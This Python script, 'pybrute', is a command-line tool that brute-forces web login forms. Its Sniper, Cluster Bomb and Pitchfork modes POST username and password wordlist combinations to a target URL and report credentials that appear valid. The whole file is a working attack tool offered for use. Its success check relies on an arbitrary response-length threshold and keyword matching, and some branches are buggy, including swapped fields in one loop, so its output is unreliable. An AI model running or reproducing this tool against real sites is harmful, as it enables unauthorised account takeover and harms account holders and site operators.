#!/bin/python3

import requests
import pyfiglet
from termcolor import colored
print()

# banner
print(colored(pyfiglet.figlet_format("pybrute", font="pagga"), color="blue"))
print(colored("Built By Jahid Hasan", color="green"))
print()

# bruteforce methods
print("BruteForce Modes:")
print(colored("""
1. Sniper
2. Cluster Bomb
3. PithFork
""", color="yellow"))

try:
    mode = input("Select One: ")
except KeyboardInterrupt:
    print("\nexit")
    exit()
print()


# Sniper Mode
if mode == "1":
    print(colored("Sniper Mode Activate", color="blue"))
    
    try:
        url = input(colored("Enter your target url: ", color="cyan"))
        user_field = input(colored("Enter username field name: ", color="cyan"))
        pass_field = input(colored("Enter password field name: ", color="cyan"))
        username = input(colored("Enter Valid username: ", color="cyan"))
        password_list = input(colored("Enter password wordlist path: ", color="cyan"))
    except KeyboardInterrupt:
        print("\nexit")
        exit()

    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    try:
        with open(password_list, 'rt') as f:
            password = []
            for line in f:
                password.append(line.strip())

    except FileNotFoundError:
        print(colored("pssword file not found", color="red"))
    
    for passwd in password:
        post_data = {
            user_field: username,
            pass_field: passwd
        }

        response = requests.post(url, headers=headers, data=post_data)
        r_len = len(response.text)
        r_text = response.text.lower()

        if r_len > 5666:
            print(colored(f"login successful {username}:{passwd}", color="green"))
            break

        elif "dashboard" in r_text or "logout" in r_text:
            print(colored(f"login successful {username}:{passwd}", color="green"))
        
        else:
            print(colored(f"faild attampt {username}:{passwd}", color="red"))
    else:
        print(colored("no valid credential found", color="red"))


# Cluster Bomb Mode
if mode == "2":
    print(colored("Cluster Bomb Mode Activate", color="blue"))

    try:
        url = input(colored("Enter your target url: ", color="cyan"))
        user_field = input(colored("Enter username field name: ", color="cyan"))
        pass_field = input(colored("Enter pass field name: ", color="cyan"))
        username_list = input(colored("Enter userlist path: ", color="cyan"))
        password_list = input(colored("Enter passlist path: ", color="cyan"))
    except KeyboardInterrupt:
        print("\nexit")
        exit()

    print()

    # username
    try:
        with open(username_list, 'rt') as f:
            username = []
            for line in f:
                username.append(line.strip())
        
    except FileNotFoundError:
        print(colored("username file not found", color="red"))
        exit()

    
    # password
    try:

        with open(password_list, 'rt') as f:
            password = []
            for line in f:
                password.append(line.strip())

    except FileNotFoundError:
        print(colored("Password file not found", color="red"))
        exit()

    found = False

    for user in username:
        for passwd in password:
            post_data = {
                user_field: user,
                pass_field: passwd
            }

            response = requests.post(url, data=post_data)
            r_len = len(response.text)
            r_text = response.text.lower()

            if r_len > 5666:
                print(colored(f"login successful {user}:{passwd}", color="green"))
                found = True
                break

            elif "dashboard" in r_text or "logout" in r_text:
                print(colored(f"login successful {user}:{passwd}", color="green"))
                found = True
                break

            else:
                print(colored(f"faild attampt {user}:{passwd}", color="red"))
        else:
            continue
        break
    

    if not found:
        for passwd in password:
            for user in username:
                post_data = {
                    user_field: passwd,
                    pass_field: user
                }

                response = requests.post(url, data=post_data)
                r_len = len(response.text)
                r_text = response.text.lower()

                if r_len > 5666:
                    print(colored(f"login successful {passwd}:{user}", color="green"))

                elif "dashboard" in r_text or "logout" in r_text:
                    print(colored(f"login successful {passwd}:{user}", color="green"))

                else:
                    print(colored(f"faild attampt {passwd}:{user}", color="red"))
            else:
                continue
            break
        else:
            print(colored(f"no valid credential", color="red"))


# PitchFork Mode
if mode == "3":
    print(colored("PitchFork Mode Activate", color="blue"))
    
    try:
        url = input(colored("Enter your target url: ", color="cyan"))
        user_field = input(colored("Enter username field name: ", color="cyan"))
        pass_field = input(colored("Enter password field name: ", color="cyan"))
        username_list = input(colored("Enter userlist path: ", color="cyan"))
        password_list = input(colored("Enter passlist path: ", color="cyan"))
    except KeyboardInterrupt:
        print("\nexit")
        exit()

    print()

    # username list
    try:
        with open(username_list, 'rt') as f:
            username = []
            for line in f:
                username.append(line.strip())
    except FileNotFoundError:
        print(colored("username file not found", color="red"))
        exit()

    # password list
    try:
        with open(password_list, 'rt') as f:
            password = []
            for line in f:
                password.append(line.strip())

    except FileNotFoundError:
        print(colored("password file not found", color="red"))
        exit()

    for user, passwd in zip(username, password):
        post_data = {
            user_field: user,
            pass_field: passwd
        }

        response = requests.post(url, data=post_data)
        r_len = len(response.text)
        r_text = response.text.lower()


        if r_len > 5666:
            print(colored(f"login successful {user}:{passwd}", color="green"))
            break

        elif "dashboard" in r_text or "logout" in r_text:
            print(colored(f"login successful {user}:{passwd}", color="green"))
            break

        else:
            print(colored(f"faild attampt {user}:{passwd}", color="red"))

    else:
        print(colored(f"no valid credential found", color="red"))

    